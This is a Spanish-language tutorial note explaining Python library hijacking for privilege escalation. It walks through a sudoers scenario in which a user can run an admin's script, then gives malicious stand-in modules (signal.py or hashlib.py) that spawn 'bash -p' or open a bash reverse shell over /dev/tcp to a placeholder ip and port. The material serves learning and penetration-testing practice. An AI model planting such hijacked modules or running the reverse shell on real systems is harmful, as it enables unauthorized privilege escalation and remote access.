-----
- Tags: #escalada #teoria #practica
-----


# Python Library Hijacking 

### Cuando hablamos de **Python Library Hijacking**, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código maliciosos en un script. El ataque se produce cuando un atacante re o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima. 

### La forma en que el ataque se lleva a cabo es la siguiente: el atacante busca una biblioteca utilizad por el script y la reemplazas por su propia versión maliciosa. Esta biblioteca puede ser una biblioteca estándar de Python o una biblioteca externa descargada e instalada por el usuario. El atacante coloca  su versión maliciosa en una ruta accesible antes que la biblioteca legítima sea encontrada.

### En genera, Python comienza buscando estas bibliotecas en el directorio actual de trabajo y luego en las rutas definidas en la variable sys.path. Si el atacante tiene acceso de escritura en alguna de las rutas definidas en sys.path, puede colocar allí su propia versión maliciosa de la biblioteca y hacer que el script cargue en lugar de la legítima.

### Además, el atacante también puede crear su propia biblioteca en el directorio actual de trabajo, ya que Python comienza la búsqueda en este directorio por defecto. Si durante la carga de estas librerías desde el script legítimo, el atacante logra secuestrarlas, entonces conseguirá una ejecución alternativa del programa. 

# Escalada 

### Supongamos que estamos en un sistema con el usuario **dobliuw** (El cual tenemos en poder) y otro usuario con mayores privilegios llamado **admin**, en el archivo de **/etc/sudoers** esta declarada la sentencia **dobliuw ALL=(admin)  NOPASSWD: /usr/bin/python3 /home/admin/myFirstScript.py**, lo cual al hacer **sudo -l** como el usuario dobliuw vemos que podemos ejecutar un script llamado *myFirstScript.py* como el usuario *admin* sin  proporcionar contraseña con python3. 

### El script es algo básico como lo siguiente: 

```python
#!/usr/bin/python3
import time, hashlib, signal, sys

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c) 

def main():
	name = str(input("Please insert your name: "));
	time.sleep(2)
	print("\n\n\t[!] Oh I understand now... Hello {} ({})\n\n".format(name,hashlib.md5(name.encode()).hexdigest()))


if __name__ == "__main__":
	main()
```
#### Es un script x de ejemplo, podría ser cualquier tipo de script. 

### En este momento es cuando, en caso de tener permiso de escritura en el directorio en el cual se encuentra el script (*/home/admin*) o tenerlo en alguna de las carpetas en donde python busca las librerías (**python3 -c 'import sys; print(sys.path)'** para ver los paths) o incluso teniendo permisos de escritura en alguna de las librerías que se importa el script, en este caso *hashlib*, *signal*, etc. podríamos acontecer un *Python Library Hijacking*.

### Por ejemplo podríamos crear el script (En la carpeta de trabajo o alguna de las otras), o incluso modificar la librería original para ingresar código malicioso que ejecute alguna acción, por ejemplo espawnear una consola como el usuario administrador aprovechando que podemos ejecutar el script como dicho usuario gracias a los permisos SUID, o enviarla a un equipo remoto, etc.

#### signal.py  ||  hashlib.py
```python
# Spawnear una consola como el usuario admin
import os

os.system("bash -p")

#############################################3

# Enviar una reverse shell como el usuario admin a un dispositivo remoto 
import subprocess

subprocess.Popen(["bash -c 'bash -i &>/dev/tcp/{ip}/{port} 0>&1'"], shell=True)
```

### Una vez teniendo el código malicioso en un nuevo archivo en el directorio de trabajo con el nombre de una de las librerías importadas en el script original, o habiendo modificado la librería real bastaría con ejecutar el script como el usuario *admin* aprovechando los permisos garantizados en el archivo de sudoers y tendríamos la ejecución de los comandos deseados.  **sudo -u admin /usr/bin/python3 /home/admin/myFirstScript.py** 
